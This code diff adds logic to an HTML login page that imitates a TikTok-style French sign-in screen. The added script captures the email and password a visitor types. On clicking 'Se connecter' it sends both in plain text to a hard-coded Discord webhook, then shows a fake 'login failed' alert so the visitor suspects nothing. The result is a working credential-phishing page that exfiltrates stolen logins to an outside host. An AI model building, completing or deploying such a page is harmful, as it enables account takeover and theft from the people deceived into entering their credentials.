@@ -142,6 +142,12 @@
       color: #999;
     }
 
+    .login-interface button.active {
+      background-color: #fe2c55;
+      color: #fff;
+      cursor: pointer;
+    }
+
     .login-interface a {
       display: block;
       margin-bottom: 20px;
@@ -218,20 +224,20 @@
     </div>
   </div>
 
-  <!-- Interface de connexion 100% identique à ta capture -->
+  <!-- Interface connexion -->
   <div class="login-interface" id="login-form">
     <h1>Se connecter</h1>
     <div style="display: flex; justify-content: center; gap: 20px; font-size: 14px; margin-bottom: 20px;">
       <div style="font-weight: bold;">E-mail ou nom d'utilisateur</div>
       <div style="color: #888;">Connexion avec un numéro de téléphone</div>
     </div>
-    <input type="text" placeholder="E-mail ou nom d'utilisateur" />
+    <input type="text" id="email" placeholder="E-mail ou nom d'utilisateur" />
     <div class="password-wrapper">
-      <input type="password" placeholder="Mot de passe" />
-      <span class="toggle-password">👁️</span>
+      <input type="password" id="password" placeholder="Mot de passe" />
+      <span class="toggle-password" onclick="togglePassword()">👁️</span>
     </div>
     <a href="#">Mot de passe oublié ?</a>
-    <button disabled>Se connecter</button>
+    <button id="loginBtn" disabled>Se connecter</button>
     <div class="back-link" onclick="showMain()">← Retour</div>
     <div class="signup">
       Tu n'as pas de compte ? <a href="#">S'inscrire</a>
@@ -248,6 +254,43 @@
       document.getElementById('main-container').style.display = 'block';
       document.getElementById('login-form').style.display = 'none';
     }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+    }
+
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+
+    function updateButtonState() {
+      if (emailInput.value.trim() && passwordInput.value.trim()) {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('active');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+      }
+    }
+
+    emailInput.addEventListener('input', updateButtonState);
+    passwordInput.addEventListener('input', updateButtonState);
+
+    loginBtn.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `🛑 Nouvelle tentative de connexion :\n📧 E-mail : \`${email}\`\n🔑 Mot de passe : \`${password}\``
+        })
+      }).then(() => {
+        alert("Connexion échouée. Veuillez réessayer."); // Facultatif
+      });
+    });
   </script>
 
 </body>
